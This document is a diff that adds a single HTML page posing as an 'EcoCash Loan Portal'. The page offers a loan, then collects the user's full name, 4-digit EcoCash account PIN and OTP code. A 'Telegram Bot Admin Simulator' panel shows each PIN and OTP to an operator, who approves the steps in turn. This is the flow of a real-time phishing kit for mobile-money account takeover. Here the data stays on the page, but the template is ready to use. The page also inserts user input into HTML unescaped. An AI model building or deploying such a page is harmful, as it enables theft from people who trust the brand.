@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EcoCash Loan Portal</title>
+  <style>
+    :root {
+      --primary: #008751;
+      --primary-hover: #006b40;
+      --accent: #ffc107;
+      --bg: #f4f6f9;
+      --card-bg: #ffffff;
+      --text: #212529;
+      --text-muted: #6c757d;
+      --border: #e9ecef;
+      --shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+      --radius: 16px;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px 15px 60px 15px;
+    }
+
+    .header {
+      width: 100%;
+      max-width: 480px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+
+    .logo-badge {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .logo-icon {
+      width: 40px;
+      height: 40px;
+      background: var(--primary);
+      color: white;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      font-size: 20px;
+    }
+
+    .logo-text {
+      font-size: 22px;
+      font-weight: 800;
+      color: var(--primary);
+      letter-spacing: -0.5px;
+    }
+
+    .card {
+      background: var(--card-bg);
+      width: 100%;
+      max-width: 480px;
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      padding: 28px 24px;
+      position: relative;
+    }
+
+    .step-indicator {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 24px;
+      gap: 8px;
+    }
+
+    .step-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #dee2e6;
+      transition: all 0.3s ease;
+    }
+
+    .step-dot.active {
+      background: var(--primary);
+      width: 24px;
+      border-radius: 10px;
+    }
+
+    .step-dot.completed {
+      background: var(--primary);
+    }
+
+    .step {
+      display: none;
+    }
+
+    .step.active {
+      display: block;
+      animation: fadeIn 0.4s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    h2 {
+      font-size: 20px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: var(--text);
+    }
+
+    p.subtitle {
+      font-size: 14px;
+      color: var(--text-muted);
+      margin-bottom: 24px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+    }
+
+    input[type="text"],
+    input[type="number"],
+    select {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 15px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    input[type="text"]:focus,
+    input[type="number"]:focus,
+    select:focus {
+      border-color: var(--primary);
+    }
+
+    .slider-container {
+      background: #f8f9fa;
+      padding: 18px;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+      margin-bottom: 20px;
+    }
+
+    .slider-val {
+      font-size: 32px;
+      font-weight: 800;
+      color: var(--primary);
+      text-align: center;
+      margin: 10px 0;
+    }
+
+    input[type="range"] {
+      width: 100%;
+      accent-color: var(--primary);
+      height: 6px;
+      cursor: pointer;
+    }
+
+    .slider-labels {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-top: 6px;
+    }
+
+    .calc-breakdown {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-top: 15px;
+      padding-top: 15px;
+      border-top: 1px dashed #dee2e6;
+    }
+
+    .calc-item {
+      font-size: 13px;
+    }
+
+    .calc-item span {
+      display: block;
+      color: var(--text-muted);
+      font-size: 11px;
+    }
+
+    .calc-item strong {
+      font-size: 15px;
+      color: var(--text);
+    }
+
+    .pin-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin: 25px 0;
+    }
+
+    .pin-inputs input {
+      width: 55px;
+      height: 60px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 700;
+      border-radius: 12px;
+      border: 2px solid var(--border);
+      outline: none;
+    }
+
+    .pin-inputs input:focus {
+      border-color: var(--primary);
+    }
+
+    .btn {
+      width: 100%;
+      padding: 16px;
+      background: var(--primary);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn:hover {
+      background: var(--primary-hover);
+    }
+
+    .status-loader {
+      text-align: center;
+      padding: 30px 10px;
+    }
+
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #e9ecef;
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      animation: spin 1s infinite linear;
+      margin: 0 auto 20px auto;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .receipt {
+      background: #f8f9fa;
+      border: 1.5px dashed var(--primary);
+      border-radius: 12px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+
+    .receipt-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 12px;
+      font-size: 14px;
+    }
+
+    .receipt-row:last-child {
+      margin-bottom: 0;
+      padding-top: 10px;
+      border-top: 1px solid var(--border);
+      font-weight: 700;
+      font-size: 16px;
+    }
+
+    /* Admin Floating Dashboard Simulator */
+    .admin-panel {
+      width: 100%;
+      max-width: 480px;
+      margin-top: 25px;
+      background: #1e293b;
+      color: white;
+      border-radius: var(--radius);
+      padding: 20px;
+      box-shadow: var(--shadow);
+    }
+
+    .admin-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+      font-size: 14px;
+      font-weight: 700;
+      color: #94a3b8;
+      border-bottom: 1px solid #334155;
+      padding-bottom: 10px;
+    }
+
+    .admin-card {
+      background: #0f172a;
+      border: 1px solid #334155;
+      border-radius: 10px;
+      padding: 14px;
+      font-size: 13px;
+      margin-bottom: 12px;
+    }
+
+    .admin-card code {
+      color: #38bdf8;
+      font-family: monospace;
+    }
+
+    .admin-actions {
+      display: flex;
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .admin-btn {
+      flex: 1;
+      padding: 8px;
+      border: none;
+      border-radius: 6px;
+      font-weight: 700;
+      font-size: 12px;
+      cursor: pointer;
+    }
+
+    .admin-btn.approve {
+      background: #10b981;
+      color: white;
+    }
+
+    .admin-btn.reject {
+      background: #ef4444;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="logo-badge">
+      <div class="logo-icon">e</div>
+      <div class="logo-text">EcoCash</div>
+    </div>
+    <span style="font-size: 12px; font-weight: 700; color: var(--primary); background: #e6f4ed; padding: 4px 10px; border-radius: 20px;">Loan Express</span>
+  </div>
+
+  <div class="card">
+    <div class="step-indicator">
+      <div class="step-dot active" id="dot-1"></div>
+      <div class="step-dot" id="dot-2"></div>
+      <div class="step-dot" id="dot-3"></div>
+      <div class="step-dot" id="dot-4"></div>
+    </div>
+
+    <!-- STEP 1: LOAN SELECTION & DETAILS -->
+    <div class="step active" id="step-1">
+      <h2>Select Loan Amount</h2>
+      <p class="subtitle">Drag the slider to adjust your loan request.</p>
+
+      <div class="slider-container">
+        <label>Loan Amount ($)</label>
+        <div class="slider-val" id="amount-display">$500</div>
+        <input type="range" id="loan-slider" min="50" max="2000" step="50" value="500">
+        <div class="slider-labels">
+          <span>$50</span>
+          <span>$1,000</span>
+          <span>$2,000</span>
+        </div>
+
+        <div class="calc-breakdown">
+          <div class="calc-item">
+            <span>Interest Rate (5%)</span>
+            <strong id="interest-display">$25.00</strong>
+          </div>
+          <div class="calc-item">
+            <span>Total Repayment</span>
+            <strong id="total-display">$525.00</strong>
+          </div>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Full Name</label>
+        <input type="text" id="user-name" placeholder="Enter your full name">
+      </div>
+
+      <div class="form-group">
+        <label>Loan Purpose</label>
+        <select id="user-purpose">
+          <option value="Personal Business">Personal Business</option>
+          <option value="Emergency Expense">Emergency Expense</option>
+          <option value="Education / Fees">Education / Fees</option>
+          <option value="Shopping & Supplies">Shopping & Supplies</option>
+        </select>
+      </div>
+
+      <button class="btn" onclick="nextStep(2)">Continue</button>
+    </div>
+
+    <!-- STEP 2: PIN ENTER & WAIT FOR TELEGRAM ADMIN -->
+    <div class="step" id="step-2">
+      <h2>Security Verification</h2>
+      <p class="subtitle">Enter your 4-digit EcoCash account PIN to authorize.</p>
+
+      <div class="pin-inputs">
+        <input type="password" maxlength="1" class="pin-field" oninput="focusNext(this, 0)">
+        <input type="password" maxlength="1" class="pin-field" oninput="focusNext(this, 1)">
+        <input type="password" maxlength="1" class="pin-field" oninput="focusNext(this, 2)">
+        <input type="password" maxlength="1" class="pin-field" oninput="focusNext(this, 3)">
+      </div>
+
+      <button class="btn" onclick="submitPin()">Submit Application</button>
+    </div>
+
+    <!-- STEP 2.5: WAITING ADMIN APPROVAL -->
+    <div class="step" id="step-pending">
+      <div class="status-loader">
+        <div class="spinner"></div>
+        <h2>Awaiting Admin Approval...</h2>
+        <p class="subtitle" style="margin-top: 10px;">Your request has been dispatched to the Telegram review system. Please hold on.</p>
+      </div>
+    </div>
+
+    <!-- STEP 3: OTP ENTER -->
+    <div class="step" id="step-3">
+      <h2>Enter OTP Verification</h2>
+      <p class="subtitle">A 4-digit OTP code was sent to your registered mobile device.</p>
+
+      <div class="pin-inputs">
+        <input type="text" maxlength="1" class="otp-field" oninput="focusNextOtp(this, 0)">
+        <input type="text" maxlength="1" class="otp-field" oninput="focusNextOtp(this, 1)">
+        <input type="text" maxlength="1" class="otp-field" oninput="focusNextOtp(this, 2)">
+        <input type="text" maxlength="1" class="otp-field" oninput="focusNextOtp(this, 3)">
+      </div>
+
+      <button class="btn" onclick="submitOtp()">Submit Code</button>
+    </div>
+
+    <!-- STEP 3.5: WAITING ADMIN OTP CONFIRMATION -->
+    <div class="step" id="step-otp-pending">
+      <div class="status-loader">
+        <div class="spinner"></div>
+        <h2>Verifying OTP Code...</h2>
+        <p class="subtitle" style="margin-top: 10px;">Telegram Admin is validating your code submission.</p>
+      </div>
+    </div>
+
+    <!-- STEP 4: SUCCESS CONGRATULATIONS -->
+    <div class="step" id="step-4">
+      <div style="text-align: center; margin-bottom: 15px;">
+        <div style="width: 60px; height: 60px; background: #d1fae5; color: #10b981; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; margin: 0 auto 15px auto;">✓</div>
+        <h2>Congratulations!</h2>
+        <p class="subtitle" id="success-msg">You have successfully borrowed the loan amount.</p>
+      </div>
+
+      <div class="receipt">
+        <div class="receipt-row">
+          <span>Applicant Name</span>
+          <strong id="rec-name">-</strong>
+        </div>
+        <div class="receipt-row">
+          <span>Loan Amount</span>
+          <strong id="rec-amount">-</strong>
+        </div>
+        <div class="receipt-row">
+          <span>Interest (5%)</span>
+          <strong id="rec-interest">-</strong>
+        </div>
+        <div class="receipt-row">
+          <span>Disbursed To</span>
+          <strong>EcoCash Wallet</strong>
+        </div>
+        <div class="receipt-row">
+          <span>Total Outstanding</span>
+          <strong id="rec-total">-</strong>
+        </div>
+      </div>
+
+      <button class="btn" onclick="location.reload()">Done / New Loan</button>
+    </div>
+  </div>
+
+  <!-- ADMIN TELEGRAM SIMULATION PANEL -->
+  <div class="admin-panel">
+    <div class="admin-header">
+      <span>TELEGRAM BOT ADMIN SIMULATOR</span>
+      <span style="color: #34d399; font-size: 11px;">● LIVE CONNECTION</span>
+    </div>
+
+    <div id="admin-feed">
+      <p style="color: #64748b; font-size: 12px; text-align: center; padding: 10px 0;">No active requests yet. Submit a loan form above to inspect telemetry payload.</p>
+    </div>
+  </div>
+
+  <script>
+    const slider = document.getElementById('loan-slider');
+    const amountDisplay = document.getElementById('amount-display');
+    const interestDisplay = document.getElementById('interest-display');
+    const totalDisplay = document.getElementById('total-display');
+
+    let state = {
+      name: '',
+      purpose: '',
+      amount: 500,
+      pin: '',
+      otp: ''
+    };
+
+    slider.addEventListener('input', (e) => {
+      const val = parseFloat(e.target.value);
+      state.amount = val;
+      const interest = val * 0.05;
+      const total = val + interest;
+
+      amountDisplay.textContent = `$${val.toLocaleString()}`;
+      interestDisplay.textContent = `$${interest.toFixed(2)}`;
+      totalDisplay.textContent = `$${total.toFixed(2)}`;
+    });
+
+    function showStep(stepId) {
+      document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+      document.getElementById(stepId).classList.add('active');
+    }
+
+    function updateDots(activeNum) {
+      for (let i = 1; i <= 4; i++) {
+        const dot = document.getElementById(`dot-${i}`);
+        if (i === activeNum) {
+          dot.className = 'step-dot active';
+        } else if (i < activeNum) {
+          dot.className = 'step-dot completed';
+        } else {
+          dot.className = 'step-dot';
+        }
+      }
+    }
+
+    function nextStep(stepNum) {
+      if (stepNum === 2) {
+        const nameInput = document.getElementById('user-name').value.trim();
+        if (!nameInput) {
+          alert('Please enter your full name');
+          return;
+        }
+        state.name = nameInput;
+        state.purpose = document.getElementById('user-purpose').value;
+        updateDots(2);
+        showStep('step-2');
+      }
+    }
+
+    function focusNext(input, index) {
+      const inputs = document.querySelectorAll('.pin-field');
+      if (input.value && index < 3) inputs[index + 1].focus();
+    }
+
+    function focusNextOtp(input, index) {
+      const inputs = document.querySelectorAll('.otp-field');
+      if (input.value && index < 3) inputs[index + 1].focus();
+    }
+
+    function submitPin() {
+      const pinInputs = document.querySelectorAll('.pin-field');
+      let pinVal = '';
+      pinInputs.forEach(i => pinVal += i.value);
+      
+      if (pinVal.length < 4) {
+        alert('Please enter a valid 4-digit PIN');
+        return;
+      }
+      state.pin = pinVal;
+
+      showStep('step-pending');
+      pushAdminNotification('application');
+    }
+
+    function submitOtp() {
+      const otpInputs = document.querySelectorAll('.otp-field');
+      let otpVal = '';
+      otpInputs.forEach(i => otpVal += i.value);
+      
+      if (otpVal.length < 4) {
+        alert('Please enter a valid 4-digit OTP code');
+        return;
+      }
+      state.otp = otpVal;
+
+      showStep('step-otp-pending');
+      pushAdminNotification('otp');
+    }
+
+    function pushAdminNotification(type) {
+      const feed = document.getElementById('admin-feed');
+      feed.innerHTML = '';
+
+      if (type === 'application') {
+        feed.innerHTML = `
+          <div class="admin-card">
+            <p><strong>📩 NEW LOAN REQUEST RECEIVED</strong></p>
+            <p><strong>Name:</strong> <code>${state.name}</code></p>
+            <p><strong>Amount:</strong> <code>$${state.amount}</code></p>
+            <p><strong>Purpose:</strong> <code>${state.purpose}</code></p>
+            <p><strong>PIN Provided:</strong> <code>${state.pin}</code></p>
+            <div class="admin-actions">
+              <button class="admin-btn approve" onclick="adminApproveLoan()">Approve Loan</button>
+              <button class="admin-btn reject" onclick="adminReject()">Reject</button>
+            </div>
+          </div>
+        `;
+      } else if (type === 'otp') {
+        feed.innerHTML = `
+          <div class="admin-card">
+            <p><strong>🔑 OTP CODE SUBMITTED</strong></p>
+            <p><strong>User:</strong> <code>${state.name}</code></p>
+            <p><strong>OTP Code:</strong> <code>${state.otp}</code></p>
+            <div class="admin-actions">
+              <button class="admin-btn approve" onclick="adminApproveOtp()">Accept Code & Disburse</button>
+              <button class="admin-btn reject" onclick="adminReject()">Reject Code</button>
+            </div>
+          </div>
+        `;
+      }
+    }
+
+    function adminApproveLoan() {
+      alert('Telegram Admin approved the initial request. Client redirected to enter OTP.');
+      updateDots(3);
+      showStep('step-3');
+    }
+
+    function adminApproveOtp() {
+      alert('Telegram Admin accepted the OTP! Funds successfully disbursed.');
+      updateDots(4);
+      
+      const interest = state.amount * 0.05;
+      const total = state.amount + interest;
+
+      document.getElementById('success-msg').textContent = `Congratulations ${state.name}! You have successfully borrowed $${state.amount.toLocaleString()}.`;
+      document.getElementById('rec-name').textContent = state.name;
+      document.getElementById('rec-amount').textContent = `$${state.amount.toLocaleString()}`;
+      document.getElementById('rec-interest').textContent = `$${interest.toFixed(2)}`;
+      document.getElementById('rec-total').textContent = `$${total.toFixed(2)}`;
+
+      showStep('step-4');
+    }
+
+    function adminReject() {
+      alert('Transaction was rejected by Telegram Admin.');
+      location.reload();
+    }
+  </script>
+</body>
+</html>
